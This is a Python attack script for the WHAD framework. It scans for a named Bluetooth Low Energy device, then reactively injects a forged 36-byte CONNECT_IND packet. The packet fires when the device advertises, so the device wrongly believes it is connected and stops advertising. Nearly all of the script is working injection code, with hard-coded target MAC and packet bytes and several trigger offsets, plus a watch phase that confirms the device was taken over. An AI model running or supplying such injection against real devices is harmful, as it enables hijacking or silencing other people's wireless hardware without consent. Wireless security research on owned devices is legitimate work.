#!/usr/bin/env python3
# 5_scan_then_inject.py — scan & confirm target, then reactively inject OUR literal CONNECT_IND
import argparse, time, threading

def _parse_args():
    p = argparse.ArgumentParser(description="Scan to confirm target advertising, then arm reactive CONNECT_IND injection.")
    p.add_argument("mac", nargs="?", default="C0:00:00:41:73:AC", help="target MAC (default: %(default)s)")
    p.add_argument("--scan-time", type=int, default=30, help="scan window seconds (default: %(default)s)")
    p.add_argument("--window", type=int, default=90, help="watch window seconds (default: %(default)s)")
    p.add_argument("--port", default="uart0", help="WHAD dongle port (default: %(default)s)")
    return p.parse_args()

ARGS = _parse_args()

TARGET      = ARGS.mac
TARGET_KEY  = TARGET.replace(":", "").upper()
PDU_HEX     = "8522AABBCCDDEEFFAC73410000C0A1B2C3D412345602000018000000C800FFFFFFFF1F2D"
RAW         = bytes.fromhex(PDU_HEX)
SCAN_TIME, WINDOW = ARGS.scan_time, ARGS.window

# ================= PHASE 1: SCAN =================
from whad.device import WhadDevice
from whad.ble.connector import Central
from whad.ble.scanning import ScanningEmulator

dev     = WhadDevice.create(ARGS.port)
central = Central(dev)
scan    = ScanningEmulator(central)
scan.start()

print(f"[1] scanning up to {SCAN_TIME}s for {TARGET} ...")
found, name, t0 = None, None, time.time()
while time.time() - t0 < SCAN_TIME and found is None:
    devs = scan.discovered_devices
    if isinstance(devs, dict):
        items = [(k, getattr(v, "name", None)) for k, v in devs.items()]
    else:
        try:    items = [(d, getattr(d, "name", None)) for d in devs]
        except TypeError: items = []
    for d, n in items:
        if str(d).replace(":", "").upper() == TARGET_KEY:
            found, name = d, n
            break
    time.sleep(0.5)

if found is None:
    print(f"[X] {TARGET} NOT seen advertising in {SCAN_TIME}s.")
    print("    -> put it in pairing mode / disconnect it from your phone, then re-run")
    raise SystemExit(1)

print(f"[OK] DEVICE IS THERE: {TARGET}" + (f'  name:"{name}"' if name else "") + "  -- advertising RIGHT NOW")

# release the dongle for reuse
for fn in (getattr(scan, "stop", None), getattr(central, "stop", None),
           getattr(central, "close", None), getattr(dev, "close", None)):
    try:
        if fn: fn()
    except Exception: pass
time.sleep(1)

# ================= PHASE 2: ARM INJECTION =================
from scapy.layers.bluetooth4LE import BTLE, BTLE_ADV_IND
from whad.ble.connector import Injector
from whad.common.triggers import ReceptionTrigger

PKT = BTLE(bytes.fromhex("D6BE898E") + RAW)
assert bytes(PKT)[4:] == RAW, "round-trip mismatch"

print("[2] reopening dongle as injector ...")
inj = None
for i in range(5):
    try:
        inj = Injector(WhadDevice.create(ARGS.port))
        break
    except Exception as e:
        print(f"    retry {i+1}/5 ({type(e).__name__}: {e})")
        time.sleep(1)
if inj is None:
    print("[X] could not reopen dongle"); raise SystemExit(1)
try: inj.start()
except Exception as e: print(f"[i] start(): {type(e).__name__}: {e} (continuing)")

ADVA_WIRE = bytes.fromhex(TARGET_KEY)[::-1]          # AC 73 41 00 00 C0
cands = [
    ("AdvA@off2",   lambda: ReceptionTrigger(pattern=ADVA_WIRE, mask=b"\xff"*6, offset=2)),
    ("AdvA@off0",   lambda: ReceptionTrigger(pattern=ADVA_WIRE, mask=b"\xff"*6, offset=0)),
    ("AdvA@off6",   lambda: ReceptionTrigger(pattern=ADVA_WIRE, mask=b"\xff"*6, offset=6)),
    ("autoADV_IND", lambda: ReceptionTrigger(packet=BTLE_ADV_IND(AdvA=TARGET))),
]
armed = []
for nm, mk in cands:
    try:
        trig = mk()
        inj.prepare(PKT, trigger=trig)
        inj.trigger(trig)
        armed.append((nm, trig))
        print(f"[+] ARMED  {nm}")
    except Exception as e:
        print(f"[-] {nm}: {type(e).__name__}: {e}")
if not armed:
    print("[X] nothing armed — send me the output of: cat inject_api.txt")
    raise SystemExit(1)

# fire-detection hooks (both dispatch paths covered)
FIRED = threading.Event()
def _arm_hook(trig, nm):
    orig = getattr(trig, "trigger", None)
    def hooked(*a, **k):
        if not FIRED.is_set():
            print(f"\n[ FIRE ] TRIGGER FIRED ({nm}) -> YOUR 36 BYTES WERE TRANSMITTED ON-AIR!", flush=True)
        FIRED.set()
        try:    return orig(*a, **k) if callable(orig) else None
        except Exception: return None
    trig.trigger = hooked
for nm, trig in armed: _arm_hook(trig, nm)
_orig = getattr(inj, "on_triggered", None)
def _on_trig(trig=None, *a, **k):
    if not FIRED.is_set():
        print("\n[ FIRE ] TRIGGER FIRED -> YOUR 36 BYTES WERE TRANSMITTED!", flush=True)
    FIRED.set()
    try:    return _orig(trig, *a, **k) if callable(_orig) else None
    except Exception: return None
inj.on_triggered = _on_trig

# ================= PHASE 3: WATCH =================
print(f"\n[3] WATCHING for {TARGET} — {WINDOW}s window (device was advertising seconds ago)")
print("[i] ALSO watch 'MDT2410161' on your PHONE (nRF Connect):")
print("    VANISHES = device accepted YOUR packet (believes it is connected)")
try:
    t0 = time.time()
    while time.time() - t0 < WINDOW:
        left = int(WINDOW - (time.time() - t0))
        print(f"    [{left:>3}s left] {'FIRED, packet sent' if FIRED.is_set() else 'waiting...'}", flush=True)
        time.sleep(10)
except KeyboardInterrupt:
    pass

print()
if FIRED.is_set():
    print("[OK] RESULT: packet WAS SENT — trigger matched the device's ADV_IND and firmware transmitted.")
    print("     Phone showed MDT2410161 vanish? -> ACCEPTED. Demo complete: your bytes hit real hardware.")
else:
    print("[X] RESULT: never fired in 90s although device WAS advertising at scan time.")
    print("     -> most likely your phone/laptop connected to it (advertising stopped) — isolate it, re-run")
    print("     -> or no pattern offset matched — send me the output of: cat inject_api.txt")
